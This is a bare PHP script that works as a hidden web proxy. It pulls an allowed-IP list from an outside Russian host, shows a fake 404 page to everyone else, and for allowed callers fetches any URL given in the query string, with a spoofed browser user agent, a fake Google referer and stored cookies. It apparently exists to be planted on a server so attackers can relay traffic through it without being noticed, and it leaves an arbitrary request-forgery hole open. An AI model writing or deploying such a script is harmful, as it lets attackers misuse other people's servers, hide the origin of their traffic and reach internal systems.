<?
header("Content-Type: text/html; charset=UTF-8");
$fileGoodIp = file_get_contents('http://8-u.ru/resources/good_ip.php');
$arrIp = explode("*", $fileGoodIp);

if (!in_array($_SERVER['REMOTE_ADDR'], $arrIp)) {
	header('HTTP/1.0 404 Not Found');
	header('Status: 404 Not Found');
	exit;
}


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $_SERVER['QUERY_STRING']);

if (isset($_POST)){
	if (count($_POST) > 0){
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $_POST);
	}
}

curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5"); 

$headers = array
(
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8',
    'Accept-Language: ru,en-us;q=0.7,en;q=0.3',
    'Accept-Encoding: deflate',
    'Accept-Charset: utf-8,windows-1251;q=0.7,*;q=0.7'
); 
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); 

curl_setopt($ch, CURLOPT_REFERER, "http://www.google.ru/");

curl_setopt($ch, CURLOPT_COOKIEJAR, "proxy_cookies.txt");  
curl_setopt($ch, CURLOPT_COOKIEFILE, "proxy_cookies.txt");  

@curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

curl_setopt($ch, CURLOPT_HEADER, 0);

curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
$result = curl_exec($ch);
curl_close($ch);

echo $result;
?>